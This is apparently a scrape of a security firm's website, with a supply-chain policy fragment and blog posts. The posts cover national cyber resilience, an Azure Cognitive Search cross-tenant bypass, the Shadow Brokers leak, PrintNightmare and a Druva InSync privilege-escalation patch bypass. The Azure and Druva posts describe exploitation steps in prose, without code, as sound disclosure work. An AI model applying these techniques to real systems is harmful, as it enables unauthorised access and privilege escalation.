menneskerettigheter. Dette for å forebygge eventuelle brudd på anstendige arbeidsforhold og menneskerettigheter. Basert på funn fra risikovurderingen vår stiller vi spesielt krav til evaluering av potensiell negativ påvirkning på menneskerettigheter og anstendige arbeidsforhold hos våre leverandører av transporttjenester, håndverkertjenester og vasketjenester til intern bruk.Om vi er usikre på hvordan leverandører og forretningspartnere påvirker omverdenen, stiller vi krav om redegjørelse og dokumentasjon, eller at de må forplikte seg til våre etiske retningslinjer gjennom bruk av Supplier Code of Conduct. Leverandører og forretningspartnere gjennomgår også en gjentakende evaluering for etterlevelse. Dersom de ikke kan dokumentere tilfredsstillende ivaretakelse av grunnleggende menneskerettigheter og anstendige arbeidsforhold, vil det kunne medføre konsekvenser for kontraktsforholdet med mnemonic.mnemonic er særlig aktsom og vil unngå samarbeid med leverandører og forretningspartnere som opererer fra land hvor det er økt risiko for brudd på menneskerettigheter og anstendige arbeidsforhold.I normale tilfeller vil vi først forsøke å påvirke leverandøren til å minimere risikoen og å reparere eventuelle brudd som er begått. Dersom det blir avdekket at mnemonic kjøper varer eller tjenester fra leverandører som har eller kan ha en negativ påvirkning på menneskerettigheter og anstendige arbeidsforhold, skal dette registreres i vårt interne saksbehandlingssystem for videre oppfølging. Ledelsen skal også varsles om dette, slik at mnemonic får iverksatt nødvendige tiltak for å begrense negative konsekvenser og eventuelt bidra til oppreising eller erstatning for dem det gjelder.De innførte tiltakene har bidratt til å redusere risikoen til et lavt nivå.Styret i mnemonic har vedtatt vår policy for Åpenhetsloven, og gitt administrerende direktør i mnemonic AS ansvar for etterlevelse av den.Dersom du ønsker ytterligere informasjon, kan du ta kontakt med mnemonic ved å sende en henvendelse til .", "url": "https://www.mnemonic.io/no/legal/aktsomhetsvurderinger/", "category": "no", "subcategory": "legal"},

{"title": "National digital security: No time to wait", "ingress": "While various government bodies are responsible for defining the way forward for Norway's digital resilience, our collective national security is also dependent on initiatives and actions being implemented from the bottom up - at each individual company", "content": "Since the new Norwegian Security Act came into force in 2019, there’s been debate around how and how quickly it should be implemented. The Norwegian Office of the Auditor General (Riksrevisjonen) has pointed out that progress on identifying and securing critical infrastructure is too slow. And while this work is ongoing, several value chains are likely to have insufficient security.This blog post discusses how Norway's digital resilience depends on measures being taken both at the national level, but also by individual companies. Furthermore, it argues that there is much that companies can and should do already today while waiting for the implementation of the Security Act.Digitalisation has come far in Norway. And many of the functions that keep the wheels of society moving have transferred to the internet. This digitalisation is important and positive for a sustainable society. However, this also makes us vulnerable. Tensions in Europe have put societal security in the forefront, and there is an urgent need to strengthen Norway's digital resilience.Since the , there’s been debate around how the requirements of the law should be implemented. It is up to each individual ministry to ensure proper security within its sectors, and to identify what is to be covered by the law; be it businesses, infrastructure or services. This work has of course required a good deal of coordination between sectors. Thus, the speed of implementation has also been reduced.Although the National Cyber Security Strategy for Norway aims to identify and secure critical infrastructure, . The identification of fundamental national functions and dependencies were supposed to be completed in July 2021, but is still ongoing. A lack of capacity and competence is highlighted as a reason. The fact that it was only last year that infrastructure related to oil and gas was recognised as being subject to the Security Act is an example of how sector-specific considerations also drag out the process.This also illustrates how security too often is being added as a reactive measure, even when we are aware of current threats and vulnerabilities.There are usually three reasons for this: The first is  While risks related to finance and the market are often mapped, the security of critical values and functions are less often part of this process. Without a comprehensive understanding of risk, it is challenging to predict how changes in the operational environment can affect the business.Another reason is . Investing in security can be perceived as a poor investment. At the same time, in many cases there is also a lack of understanding that the costs of incidents can be far higher than for preventive measures, not only for the business, but also for the value chain and society in general. This is related to the last reason, which is . Not only does Norway's digital resilience depend on measures taken by each individual business, but the individual business also depends on effective national functions. Together, we can work to become more proactive in securing national interests.While the identification of dependencies linked to fundamental national functions is ongoing, several value chains are likely insufficiently secured. However, these challenges are not new. Previous reports from the Norwegian Office of the Auditor General also emphasises these risks. , the office found that Norway's power supply was not sufficiently prepared for cyber-attacks. , another report revealed that the Norwegian Armed Forces have not been able to secure their information systems. In parallel with this,  and  highlight that state-supported threat actors may be willing to take increased risks in their operations against Norwegian interests. We must accept that implementation of the Security Act will take time. At the same time, we cannot afford to stay passive.Pending implementation of the Security Act, much can be done today. Many of the competences, capacities and abilities to implement digital security lie outside the public sector. But how can we mobilise these capacities?Part of the answer may be found in increased coordination between public and private actors. Knowledge is a prerequisite for identifying and addressing security needs. In order to form a common situational awareness arrangements should be made for increased information sharing, also from and between private entities. The National Cyber Security Center (NCSC) is a natural common ground that can help strengthen coordination. We also see the positive effect of sectoral CERTs (such as NKom, KraftCERT and Nordic Financial CERT), both as coordinating bodies in their own sector and as links between the Norwegian National Security Authority (NSM) and private business. Such arenas could be strengthened, and more sectors included.In 2017, NSM created a quality scheme for suppliers that offer incident management. The arrangement is a good illustration of how public and private actors can work together to improve the pace and quality of security work. This model could be extended to more security-related domains, and include other competent security environments.But the most important thing is probably the effort made in each individual business. Together, we can form a robust digital foundation, which both supports and receives support from national functions. If we are to succeed with digitalisation, it is a prerequisite that companies and organisations place more emphasis on increasing their own resilience to cyber-attacks.NSM's fundamental principles for ICT security are a good place to start, even for companies that are not subject to the Security Act. We can also contribute by taking an active part in organisations that coordinate this kind of work, like the NCSC, the Norwegian Business and Industry Security Council or sectoral CERTs. As well as by seeking help and advice on how your company can improve its ability to protect itself from qualified entities.There is no time to wait.", "url": "https://www.mnemonic.io/resources/blog/national-digital-security-no-time-to-wait/", "category": "resources", "subcategory": "blog"},

{"title": "ACSESSED: Cross-tenant network bypass in Azure Cognitive Search", "ingress": "How enabling a single vulnerable feature removed the entire network and identity perimeter around internet-isolated Azure Cognitive Search instances.", "content": "This blog post provides a technical description of a 0-day vulnerability that I found in Microsoft Azure back in February 2022.The vulnerability, which I dubbed “ACSESSED”, consisted of a cross-tenant network bypass, allowing anyone with the right amount of information to access data located in private instances of Azure Cognitive Search (ACS) from any tenant and location.The vulnerability was reported on February 23rd and fixed by Microsoft on August 31st 2022.This blog post covers the following:Over the past two years, Microsoft Azure has been confronted with a significant number of serious vulnerabilities such as , , or the infamous cross-tenant bypass in the  to name a few.Due to popularity of the Azure platform in the Nordics, our penetration-testing teams are often exposed to Azure environments of different kinds, complexities and sizes, making it easier to keep up with the fast-growing pace of new features released by Microsoft.One day, a new feature suddenly appeared in the networking options of the ACS service, while conducting a customer engagement:Based on the information provided in the portal, it seemed like the feature was supposed to create an exception in the resource’s firewall, so that accessing its data plane via the Azure portal was possible even when strict network restrictions were applied to the resource (e.g. exposed on a restricted public endpoint, a private endpoint or without any explicit network exposure).Immediately, I started wondering how the feature actually worked under the hood:As this was completely undocumented when I first noticed the feature back in February 2022, I decided to investigate it, to try understanding the consequences of enabling that new button. (ACS) is a very popular search engine service for full-text search, which essentially allows customers to search within their data in a very fast way using indexes. The service supports multiple types of search approaches, such as text search, fuzzy search, autocomplete, or even location-based search.In order to investigate the new networking feature of ACS, I first started by deploying a brand new instance of the service in a test environment, using all the default options. I also made sure the instance was not exposed on any network, by disabling both public and private network access completely. The only networking option enabled at this point was the new “Allow access from Portal” configuration:Additionally, I imported test data to the instance, using the built-in data source called “hotels-sample”, to have some data ready to query:Once confirming that I could retrieve data from my network-isolated ACS instance via the Azure portal’s built-in search explorer, I started investigating the service to understand how that was possible.First, I started looking at the instance’s raw configuration, as I was wondering what kind of IP address the new feature whitelisted in the resource’s firewall. To my surprise, no IP was whitelisted. Instead, the instance’s \"networkRuleSet.bypass\" property was set to \"AzurePortal\", as follows:According to the official documentation for the , the bypass property allows the specified origin to bypass all networking rules defined in the resource’s \"networkRuleSet.ipRules\" configuration (i.e. its firewall). In other words, that property was the one making it possible to reach the data plane of the ACS resource from the Azure portal, regardless of the networking rules defined for the instance. Note that only \"None\" and \"AzurePortal\" were valid values for the bypass property and submitting arbitrary IP addresses or strings was therefore disallowed.The \"AzurePortal\" value looked like a service tag, so I started wondering what kind of IP addresses might be whitelisted behind the scene. Based on Microsoft’s overview of , it seemed like the effective IP addresses associated with the service tag varied based on global regions, which in the case of my ACS instance corresponded to the IP addresses of the North-Europe region:At this point, I started to wonder if the “Allow access from Portal” feature simply allowed using the IP addresses associated with the \"AzurePortal\" service tag. At the same time, I felt like being able to impersonate IP addresses belonging to a service tag could potentially create huge security issues for other services.The second step of my investigation therefore consisted of analysing the traffic sent by my client when using search explorer to retrieve data from the ACS instance. I quickly noticed requests towards the \"stamp2.ext.search.windows.net host\", which according to , consists of the domain of the traffic manager and represents the IP address of the Azure portal in the current location. At the time of the investigation, the IP address of the Azure portal in my region (North Europe) was 20.50.216.43. However, that address was neither contained in the IP range of the \"AzurePortal\" service tag for the North Europe region, nor was it contained in the IP ranges of other regions. I started to get confused at this point, as it was not clear what the \"AzurePortal\" service tag was really whitelisting behind the scene and what role the \"stamp2.ext.search.windows.net\" host actually played to allow retrieving data via the Azure portal.I kept investigating the requests towards the \"stamp2.ext.search.windows.net\" host and quickly noticed they were all hitting the same endpoint with the same set of uncommon headers:As illustrated above, the requests were all hitting the \"/api/<path-to-resource>/invoke\" endpoint, and submitted search queries to the data plane of my ACS instance via an \"X-Ms-Path-Query\" header. Additionally, an access token was required for authentication, besides the API key of the ACS instance.In other words, it seemed like the \"stamp2.ext.search.windows.net\" host was used as a whitelisted proxy, allowed to submit search queries on behalf of the bearer of the submitted access token.At first, the use of the portal proxy (i.e. \"stamp2.ext.search.windows.net\") seemed like a convenient approach, as it allowed a large number of users from different locations to access the data plane of a private ACS instance, without the need to whitelist every single IP address in the instance’s firewall.Additionally, it allowed switching the traditional network perimeter in the form of IP whitelisting, with an identity perimeter relying on access tokens issued and managed by Azure AD instead. Note that whether a network perimeter should be replaced by an identity perimeter in the first place is a questionable choice, but digging into that subject is outside the scope of this article.I assumed the access token submitted to the portal proxy was used for the following purposes and pursued therefore my investigation into that direction, to verify whether that was the case:To my surprise, it turned out that the only thing Microsoft was validating in the backend was that the submitted access token was still valid (i.e. not expired) and that it was issued for the \"https://management.core.windows.net/\" audience, which corresponds to the Azure Resource Manager (ARM) API.This effectively meant that given enough information, anybody could reach the data plane of my network-isolated ACS instance from any tenant and location, as obtaining a valid access token for the ARM API is as simple as logging into the Azure portal of any arbitrary tenant.This seemed to answer my original question on whether the new feature made an exception for  instance of the Azure portal or if it made an exception for . However, allowing anybody with enough information to reach the data plane of any ACS instance with the “Allow access from Portal” feature enabled, including those without any apparent network exposure (i.e. without a private, service or public endpoint), seemed more like a vulnerability to me than an intended purpose. I decided therefore to create a proof of concept and report the issue to Microsoft on February 23rd 2022.The prerequisite to exploit this issue successfully was to gather enough information about a targeted ACS instance with the vulnerable feature enabled. The full set of information required was as follows:From there, retrieving data from the targeted instance using the whitelisted portal proxy was as simple as a single request. I made a curl template for Microsoft to reproduce the issue, where the information above could be filled in quickly and easily:As illustrated below with a simple proof of concept, retrieving data from my private ACS using an access token belonging to another tenant was fully possible:The ACSESSED vulnerability impacted all ACS instances deployed with the “Allow access from Portal” feature enabled.By enabling that feature, customers effectively allowed cross-tenant access to the data plane of their ACS instances from any location, regardless of the actual network configurations of the latter. Note that this included instances exposed exclusively on private endpoints, as well as instances without any explicit network exposure, such as the one I deployed for investigation (i.e. instances without any private, service or public endpoint).By the simple click of a button, customers were therefore able to turn on a vulnerable feature, which removed the entire network perimeter configured around their ACS instances, without providing any real identity perimeter (i.e. anybody could generate a valid access token for ARM).I first reported the ACSESSED vulnerability on February 23rd as a privilege escalation with a moderate impact, according to Microsoft’s . The issue was confirmed on March 22nd and its severity was raised from moderate to important, due to its cross-tenant aspect and easy exploitation.Altogether, Microsoft used approximately 6 months to patch the issue from the day I reported the vulnerability on the . Since the ACSESSED vulnerability was only server-side and did not require Azure customers to take any specific actions, it did not get a CVE, as per Microsoft’s internal policy.Once Microsoft notified me on August 31st that a patch had been pushed to the ACS service, I decided to investigate it and re-test the ACSESSED vulnerability. I should mention that this part of the blog post is something I often miss from articles describing new vulnerabilities, as understanding how the issue was fixed is always interesting from a security point of view.In order to investigate the patch, I followed the same procedure as the original investigation, by deploying a brand new instance of ACS in a test environment, using all the default options and disabling all network access completely.I quickly noticed that the old button had now been replaced with a link to Microsoft’s documentation, explaining that allowing search queries through the Azure portal could be achieved by exposing the ACS on either a  or :The first solution was to expose the ACS on a private endpoint and deploy a Virtual Machine (VM) with a web browser in the same Virtual Network (VNet) as the endpoint, while the second solution consisted of exposing the ACS on a public endpoint and whitelist the originating IP address of the user’s client. Note that the documentation still states that “allowing access from the portal IP address  your client IP address” is necessary for the second option, although whitelisting the client’s IP address seemed to be enough during the re-test.My first observation was that the new design was significantly less complex than the previous one, as it essentially relied on IP whitelisting instead of using the portal proxy and all its complexity. Additionally, accessing the data plane of an ACS without any explicit network exposure was not possible anymore, which definitely removed some logical confusions about the feature.I originally expected Microsoft to stick with the original design and implement proper validation when submitting the access token to the portal proxy, to verify that it was issued for the same tenant as a queried ACS, and ensure that it was associated with a security principal with enough read permissions on the data plane of the ACS instance.As shown above in the disclosure timeline however, Microsoft reported in June 2022 that the patch required “a significant design-level change”, which ultimately resulted in a simplified design. One disadvantage of that new design is that each person who needs to query an ACS through the Azure portal needs to whitelist their IP address in the instance’s firewall, which might be a pain in situations where a large number of users need to interact with the data plane of an ACS.This might actually be the initial reason for the original design, where based on my understanding, the idea was to whitelist a single service tag (i.e. \"AzurePortal\") and rely on identities to provide access to the data plane of an ACS instance, therefore avoiding the need for whitelisting multiple IP addresses. Even if patched correctly, the main drawback of that design was the lack of clarity, as “Allow access from portal” was clearly a networking feature, but the list of principals with the ability to bypass network restrictions via the portal proxy was found in the Identity and Access Management (IAM) section of the ACS’ configuration.The current design provides therefore more transparency and clarity, as anyone who is able to access the data plane of an ACS is now required to whitelist their IP address in the firewall of the instance, which makes it a lot easier to keep an overview of all the entities allowed to query an ACS, compared to the previous implementation.Finally, I wanted to verify if it was still possible to exclude the \"AzurePortal\" service tag from the network configurations of my new ACS instance, and see if I could still query its data plane through the portal proxy.Since the “Allow access from Portal” button was gone, I investigated the  to set the value of the bypass property in the ACS instance to \"AzurePortal\" manually. To my surprise, this was still possible (probably to avoid breaking changes in the resource’s data model). However, querying the data plane of the new ACS instance via the portal proxy did not work anymore, as trying to use the invoke method from the original design returned the following response, suggesting that the function was now disabled by Microsoft:\"{\"error\":{\"code\":\"\",\"message\":\"Invoke URI requests are disabled\"}}\"In the end, it remained unclear whether the ACSESSED vulnerability impacted other Azure services, as several resources have a similar feature, but it is not always implemented in the same way. For example,  has a networking feature called “”, which once enabled, whitelists specific IP addresses in the resource’s firewall, instead of relying on the portal proxy. Network-bypass functionalities constitute therefore an interesting area of research, as such features can potentially open the doors for more bypasses than what is intended in the first place.The ACSESSED vulnerability is a very good example of how enabling a simple feature can significantly deteriorate the security posture of an environment without even realising it.Hopefully, this blog post will help raising awareness about the importance of being critical to cloud features and services, as well as technology in general, even when developed by well-established vendors such as Microsoft.Although the use of a specific cloud technology implies having a certain level of trust towards its provider, issues like the ACSESSED vulnerability highlight the importance of gaining a deeper understanding of cloud services than what may be acquired through documentation only. I hope this article will help inspire cloud professionals to explore even the simplest feature introduced in their favourite services, and be critical to the security implications of those additions.", "url": "https://www.mnemonic.io/resources/blog/acsessed-cross-tenant-network-bypass-in-azure-cognitive-search/", "category": "resources", "subcategory": "blog"},

Updated summary to reflect that  (part of the  suite) customers will now receive notifications if any of their internal or external systems have “DoublePulsar” installed.: Added update to summary regarding the WannaCry ransomworm that spread across the Internet on Friday May 12th by leveraging the EternalBlue exploit.: Added update to summary regarding the Petya/ NotPetya/ GoldenEye ransomware spreading. For more information about this, please visit Last year a group named “The Shadow Brokers” attempted to auction a data dump allegedly claimed to come from the NSA. The dump consisted of multiple tools and information about vulnerabilities for a wide range of applications and operating systems. At the time, the group was not able to sell the dumps at their desired price. The actor behind the tools and exploits has also been called “Equation Group”.On April 8, 2017 The Shadow Brokers published the password for one of the encrypted dumps that was made public last year. This dump included several tools and vulnerabilities for attacking Linux and other Unix based operating systems and applications.On the 14 of April the group made available three more data dumps. These dumps include vulnerabilities, tools, operative notes from (allegedly) the NSA and a framework for running exploits and building malware. Amongst the dump are several vulnerabilities that can be used to target various Windows operating systems ranging from Windows XP to Windows 2016.Most of the vulnerabilities in the published dumps were patched by Microsoft in March 2017. Argus Managed Defence – mnemonic’s  - detects most of the disclosed attacks and has contained signatures both in log analysis and network detection services for quite some time. The  service (part of the Argus Managed Defence suite) also detects systems compromised by “DoublePulsar”.The data from the dumps seem to be from 2013 and earlier and therefore does not appear to include any ready to use exploits against Windows 10 or Windows 2016.While the exploits and attack tools are important to build detection capabilities and mitigation strategies for reducing the attack surface, of even more concern may be the additional data and tools in the dump.The data includes a playbook on how an advanced attacker can comprise networks, maintain persistence and remain undetected. The tools include advanced capabilities for hiding backdoors, control channels and installed utilities, along with deleting single records within log files and changing timestamps. Although some of the techniques are not new, they are now gathered together and include documentation to enable any threat agents to attack with advanced capabilities. : Multiple reports are confirming that the leaked tools are being used to exploit and compromise machines and networks. Initial scanning with Shodan showed on Thursday April 20th around 15 000 systems compromised with \"DoublePulsar\".: The number of compromised hosts with “DoublePulsar” installed is now reported to be more than 200 000 machines. Note that customers of mnemonic's  service (part of the  suite) will receive notifications if any of their internal or external systems have “DoublePulsar” installed.: On Friday May 12th, the WannaCry ransomware was distributed using a worm leveraging the EternalBlue SMB exploit. The worm exploits the SMB vulnerability patched by Microsoft in March 2017 (MS17-010) and spreads itself both on the local network and over the Internet on port 445. After successful exploitation, it installs the DoublePulsar backdoor and then proceeds to load the ransomware component. Numerous technical articles about this attack have been published, and the attack has been covered extensively by the mass media. The WannaCry attack also has a dedicated Wikipedia page. The only confirmed distribution vector is through the EternalBlue SMB exploit.“The Shadow Brokers” have released three data dumps:The vulnerabilities and tools grant anyone the capabilities of an advanced attacker. While these capabilities already exist through Metasploit, the difference is now there are multiple vulnerabilities in widely distributed applications and operating systems affiliated with the tools. Several of the published exploits can also be used in Worms and other wide spread attacks.It is expected that ransomware and other malware types from cybercriminals leveraging these vulnerabilities and tools will arise within days. Most of the vulnerabilities can be mitigated by updating the software with the latest patches. The actual malicious code currently has low to no detection. Some of the malicious code also run in the kernel of the operating system and once installed is difficult to detect both within the network and on the system itself. On April 16th we observed exploits from the Shadow Brokers dump being repurposed for the distribution of ransomware. Unfortunately for defenders this was published on the Friday during the Easter holidays, and the data dumps are large. There is currently limited information about the extent of the dump, but our initial investigations point towards this dump causing substantial damage towards multiple organizations. We have added CVE details for the exploits where we have matched the vulnerabilities to existing vulnerabilities (or newly assigned CVE). The CVE descriptions can be helpful to identify if your organization has any of the vulnerable applications (and versions) installed and how to mitigate the vulnerabilities. Most of the exploits in the dumps are against old applications and versions. Most of these are no longer supported by the vendors or the vendors have patched the vulnerabilities. Some of them are within the 0-day category.Some of the details we currently have available:List of codenames for various exploits and the current knowledge about them.: Descriptions on how to exploit.

This part of the release perhaps represent the elements that will have the most severe impact in the long-run.It contains detailed documentation on how an advanced attacker avoids detection, removes deployed tools and protect their control over the compromised environment. The tools show advanced encryptions tools used, how to create hidden channels in/out of compromised networks and how to work with environments in various operating systems. List of codenames for tools and malware installed at compromised machines.GUI-based framework for conducting post-exploitation tasks. The frontend interacts with an exploited machine and can perform multiple tasks related to post-exploitation and controlling of the host. Supports retrieving data, cleaning logs, changing timestamps and more. Kernel based backdoor, which can be reached by “portknocking” RDP/SMB. Since the backdoor is installed in kernel level it is difficult to detect. Some tools have been released which can scan machines from the network to detect installed DoublePulsar. Python based framework for running exploits and tools against target machines and applications. The framework is built for running on Windows machines. The version within the data dump from “the Shadow Brokers” contains 13 exploits and various additional tools for running on compromised machines. The framework is similar to the open source project Metasploit. Framework for keylogging first described in the Snowden release.

The patch is not yet available for all systems, but Microsoft says in their update that they will release the update for all systems as soon as they are ready for release.The Microsoft Windows print spooler service (which is enabled by default on all Windows systems) fails to restrict access to the RpcAddPrinterDriverEx() function which is used for installing a printer driver on a system. This can allow a remote, authenticated attacker to execute malicious code with SYSTEM-level privileges on vulnerable systems.On June 29, PoC exploit code for CVE-2021-34527 was uploaded to GitHub by security research firm Sangfor, presumably by mistake as the code was removed a few hours later. The exploit code was cloned while it was publicly available and is now widely available online. Exploit code for this vulnerability targeting Active Directory domain controllers, is referred to as \"PrintNightmare\".Our Technical Risk Services department has successfully verified the exploit. This vulnerability should be mitigated .It is important to note that the June 8 Microsoft Patch Tuesday update will  address this vulnerability and Microsoft has not yet released a proper fix for this issue. It was previously believed that PrintNightmare was the same issue as CVE-2021-1675 and the June 8 patch failed to address it properly. Microsoft has now stated that PrintNightmare is a separate issue from CVE-2021-1675 and CVE-2021-1675 was patched in the June 8 updates.At the time of writing, the only current, known workarounds are to disable the print spooler service, uninstall print-services (which is enabled by default on all Windows systems), or disable inbound remote printing. It is critical that this fix is applied to domain controllers.Given the wide availablity of proof-of-concept exploit code for PrintNightmare, mnemonic assesses that this exploit will be leveraged by a broad range of threat actors including nation-states, crime-syndicates, criminals, and opportunists.CVE-2021-34527 affects the following versions of Windows:While CVE-2021-34527 affects all of the above operating systems, it has not been confirmed whether PrintNightmare is exploitable on all of these systems. At the time of writing this advisory (01.07.2021), mnemonic has confirmed that PrintNightmare is exploitable on fully-patched Windows Server 2019 and 2016 domain controllers. Microsoft is currently assessing whether non-DC systems are affected by this vulnerability.If not properly mitigated, a remote, authenticated attacker may be able to execute arbitrary code with SYSTEM-level privileges on a vulnerable system by sending a specially-crafted RPC request.mnemonic recommends that you perform the following actions:Detection methods are under continuous development and are deployed on an ongoing basis.", "url": "https://www.mnemonic.io/resources/blog/threat-advisory-printnightmare-critical-vulnerability-in-windows-cve-2021-34527/", "category": "resources", "subcategory": "blog"},

Druva had by then implemented a patch on their latest InSync release, fixing the bug. However, the patch introduced an additional bug, paving the way for further exploitation and making it possible for a local low-privileged user to obtain  level privileges. A team from Tenable Research and myself concurrently discovered this new vulnerability, resulting in a new CVE ().Druva InSync is an endpoint application that according to their website is responsible for “Integrated backup, eDiscovery and compliance monitoring”. The InSync Windows client application runs a service as , hence any security vulnerability could lead to an Escalation of Privileges (EoP). The  bug initially discovered by Tenable Research is a Local Privilege Escalation via Command Injection. The escalation is accomplished by interacting to the local service running on port 6064 by means of valid network commands. The communication protocol is pretty straightforward and it requires the following packets to be sent one at a time:Setting in motion IDA and verifying that function number 5 is exposing remote command injection, gives this result:And sure enough, at location 140001F60 we spot our beloved  taking the command line string as an argument.This is clearly an unrestricted command injection that allows us to execute any commands with the same privileges as SYSTEM user. This made me curious and I started to dig deeper into how the vulnerability had been mitigated.Druva’s  stated that the latest 6.6.3 release included a fix, which can be downloaded .When running the old exploit against the latest version, we fail and get warned by an admonitory message.As an initial strategy we can  the patched  function to see if there is an additional check in place or any other changes to the previous version.It seems that a  has been introduced: any binary invoked outside the scope of the inSync path will just be ignored. This poses the questions; which string is representing the allowed path? And how is the verification actually done? Let’s deal with one thing at a time. Firstly, let’s take a closer look at the two functions, and that are responsible for the branching decision.To check the path length, is called first, whose argument is the  variable, derived by the following function, which has obviously hardcoded parameters matching the expected application path .This parameter is then passed to , which gives as a result. Via WinDbg we can double-check that, in my specific case, the path-string is indeed 29 character long.This value is then saved in (as MaxCount) and passed together with our entire command to . Pay extra attention here, because the devil always sits undisturbed in the details.As opposed to  which is dealing with null-terminated strings,  is returning a 0 (identical strings) if one of the two checked ** non-null-terminated** substrings are identical for the given N characters, no matter how many extra characters are prepended afterwards.Here is the definition from MSDN:int strncmp(const char *string1,   const char *string2,   size_t count);This means that,  (or in IDA) tells to stop checking as long as we have a match up until the end of the application path, regardless of any additional characters, null-byte included.As an example, we can test the following string  and verify through WinDbg if we can get past the check. We place a breakpoint after the string comparison has been done and take a look at the returned value from EAX.The value is zero, and according to MSDN this means that the two substrings are identical:Return value   Description------------   -----------< 0            string1 substring less than string2 substring0              string1 substring identical to string2 substring> 0            string1 substring greater than string2 substringThis also means that we are jumping to the  branch, and successfully spawn a process.An additional interesting bit from the above output is that the residual value pointed by is the exact remainder of the string we sent.This means that by prepending the submitted path with many  we can still execute any system-wide-available binary, and that’s also the principal change I made to the original code. The complete new version of the exploit is available , and is also available on .We could also reuse the original exploit by simply inserting the right amount of dot-dot-slashes.As a key takeaway, it’s always good practice to verify how a vendor implemented a patch: the learning experience can be great and might give back unexpected findings. Specifically, to this application, this process made it obvious that due to the direct use of C-like functions instead of standard Windows API, a local low-privileged user could obtain SYSTEM level privileges by escaping the allowed PATH via directory traversal./", "url": "https://www.mnemonic.io/resources/blog/when-a-security-patch-introduces-a-0-day/", "category": "resources", "subcategory": "blog"},

{"title": "Purple Team Part 2: Lessons learned from a year of delivering Purple Team exercises", "ingress": "A year of Purple Team testing has been an enlightening journey. Discover the real-world lessons and insights we've gathered along the way.", "content": "Want to know more about this topic? Read our In Purple Team Part 1: Improve your defensive success with Purple Team exercises, we described the concept of Purple Team and how we execute exercises with the mnemonic Purple Team platform. We started offering Purple Team exercises to customers in 2022, and it was an immediate hit. Because of this, we have improved and scaled up the service quickly.We're pleased with the organic growth of this service from just a general idea to something significant and easily approachable. We've learned a lot along the way and invested considerable time into professionalising Purple Team exercises to deliver them at scale to our customers.If you are interested in detection and response or are responsible for this in an organisation, this blog post will explain why Purple Team exercises should be on your radar. This post discusses the valuable lessons we learned during Purple Team exercises over the past year. These are:These lessons mean we no longer hold up valuable IT security people for days. It has allowed us to scale the service and lower the entry barrier for the organisations we work with in a way we did not anticipate six months ago. Not only do we love and embrace automation wherever we can apply it, but in this case, it was necessary to successfully continue delivering Purple Team exercises at scale to our customers.Improving upon these lessons has allowed us to pave the path for repeatable and measurable detection testing at scale. Here's what's next for Purple Team exercises by mnemonic:If you read Part 1, you should know a little about our definition of Purple Team and the general method for executing them. What have we learned so far from running actual Purple Team exercises?The Red Team typically leads Purple Team exercises, and although the Blue Team is involved, they are often an afterthought. However, we have learned through trial and error that integrating the Blue Team into every exercise stage is crucial for the exercise's success and the organisation's improvement. Not involving the Blue Team can cause unnecessary stress and confusion, turning the exercise into a Red Team activity. To avoid this, we strongly recommend integrating the Blue Team into every stage of the test.While unannounced exercises can be valuable in certain situations, we have found that announcing our Purple Team exercises and involving the Blue Team in every stage is more effective. This approach eases the entry barrier to performing exercises, is easier to plan and execute, and leads to less headache caused by secrecy. It also allows us to focus more on improving the organisation rather than spending time and resources on administration.It is important to note that the goal of Purple Team exercises is not to simulate a full-scale attack in real time but to assess detection and response capabilities for individual attack techniques. Integrating the Blue Team into these exercises provides a more accurate scope of tests, allowing for more effective targeting of detection capabilities. It also provides a better ability to measure the effectiveness of specific capabilities, tools, processes, or technologies used in detection and response.Integrating the Blue Team into every exercise stage provides many benefits, including team collaboration and learning, more accurate testing, and a better ability to measure defensive effectiveness.Some of our first Purple Team exercises started, like many things in the IT world, with MS Word. We began with unarguably barebones planning, execution and reporting of the first exercises we ran. The screenshot shows the first few rows of a table in Word from a planning and execution document. It's primitive and not fantastic, but it got the job done.This system barely lasted one or two exercises before the information required to support the Blue Team grew out of proportion. We suddenly had to report on Event IDs, process IDs, how to detect specific techniques, the status for detection across multiple teams and a range of other indicators. That led to the number of columns in our Word table growing beyond the size of a landscape mode A4 page, so we realised we had to expand. And when you have no dedicated software for a problem you are trying to solve, Excel becomes your software. This screenshot briefly shows a similar system but expanded for increased detail in the reporting. We used a single spreadsheet in Excel with sorting and filtering to plan, execute and report an entire exercise. This spreadsheet also got the job done, but with lots of headaches, not just from managing massive spreadsheets but shipping the document between different teams, keeping it in sync, etc. Our Excel template nearly went to column AA (that's when you get past columns X, Y and Z).You may wonder why we did not immediately find a better tool for the job. The YAGNI principle (\"You Aren't Gonna Need It\") is a practice in software development which states that features should only be added when required. So, our approach was to start with a minimum viable offering, with limited tool support and a significant amount of manual labour. We could have comprehensively evaluated different Purple Team platforms, written an elaborate Purple Team framework and developed a full delivery model with \"everything automated\". But if Purple Team did not pan out, that would have been a waste for us and our customers. We saw that the organic growth of Purple Team exercises was better than trying to be perfect from day one, and this still applies. We've always been honest with our customers that this is a new service and that we're still ironing out the kinks as we go along.So, what was the lesson learned here? MS Office is all right, but its ease of use makes it easy for eager engineers to create software through raw persistence. Necessity is the mother of invention, and there was a necessity here. If you read Part 1 of this blog post, you will see how mnemonic uses the officially licensed product Vectr to support or Purple Team platform. This has given us a much more resilient way of planning, executing and reporting campaigns and test cases. We've yet to look back at Excel and Word even once since we started using them.Initially, we tried very hard to design elaborate attack scenarios for our Purple Team exercises, mimicking real attacks. For some organisations, this was interesting and seemingly had value. It was \"a good story\" and had an alarming effect on the readers of the executive summary reports of the exercises we delivered. However, considerable time and resources went into designing scenarios and stories. Still, eventually, the executed test cases were largely independent, and our Purple Team exercises did not simulate any single attack or follow a kill chain either way. At best, it was a haphazard collection of attack techniques loosely fitted to cover the MITRE ATT&CK tactics from execution to Impact.Another pitfall we identified was that Red Team operators from a penetration testing background tend to execute Red Team operations in the same way as penetration tests, with the same tools and a limited understanding of how real attackers operate. Involving our Threat Intelligence Team helped our Red Team better understand actual threats and shift from a penetration test mindset to a proper threat intelligence-based approach. By applying our Threat Intelligence Team, we have gained a deeper understanding of threat categories such as Nation State Groups (NSG), Organised Crimes Groups (OCG), and even threat actors targeting specific sectors with specific Tactics, Techniques and Procedures (TTPs) that these groups use. This approach also aligns with our Red Team Framework™ and TIBER methodology, making all the adversary simulation services we deliver, including Purple Team exercises, better and more Threat Intelligence-based.Through working with our Threat Intelligence department, our Red Team operators have been exposed to the world of Threat Intelligence and can rigorously apply what they have learned. We've gained a much better understanding of how real threat actors operate and are getting unstuck from the penetration test bubble we have been in. We've discovered that an enormous range of machine-readable threat intelligence is readily available, and we're finding better ways to apply it. Realising that a lot of this was possible to import directly into our Purple Team platform for visualising and simulation was a remarkable finding for everyone involved. Here are some of the sources we have learned to love:When we started, we designed scenarios and test plans that 